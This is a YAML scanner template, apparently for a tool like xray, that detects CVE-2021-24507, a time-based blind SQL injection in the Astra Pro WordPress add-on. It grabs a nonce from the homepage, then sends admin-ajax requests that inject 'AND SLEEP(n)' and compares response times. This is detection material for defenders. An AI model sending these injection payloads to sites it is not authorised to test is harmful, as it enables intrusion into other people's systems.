name: yaml-poc-brainstormforce-astra-sql_injection-CVE-2021-24507
binding: 55e32c64-47d7-4dd1-a3fd-2a536fc67be3
detail:
    author: jiapeng.han
    links:
        - https://wpastra.com/changelog/astra-pro-addon/
        - https://wpscan.com/vulnerability/a1a0dc0b-c351-4d46-ac9b-b297ce4d251c
    vulnerability:
        id: 84f433d1-02f9-4e05-b9a7-9c2f03c856e6
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(3, 6)
rules:
    nonce:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("infinite_nonce") && response.body_string.contains("var astra = {")
        output:
            nonce: '''"infinite_nonce":"(?P<nonce>.*?)",''.bsubmatch(response.body)["nonce"]'
    r1:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=astra_pagination_infinite&page_no=1&nonce={{nonce}}&query_vars=%7B%22tax_query%22%3A%7B%220%22%3A%7B%22field%22%3A%22term_taxonomy_id%22%2C%22terms%22%3A%5B%221+AND+SLEEP(0)%22%5D%7D%7D%7D&astra_infinite=astra_pagination_ajax
            follow_redirects: false
        expression: response.status == 200
        output:
            r1latency: response.latency
    r2:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: action=astra_pagination_infinite&page_no=1&nonce={{nonce}}&query_vars=%7B%22tax_query%22%3A%7B%220%22%3A%7B%22field%22%3A%22term_taxonomy_id%22%2C%22terms%22%3A%5B%221+AND+SLEEP({{s1}})%22%5D%7D%7D%7D&astra_infinite=astra_pagination_ajax
            follow_redirects: false
        expression: response.status == 200 && response.latency - r1latency >= s1 * 1000 - 1000
expression: nonce() && r1() && r2()
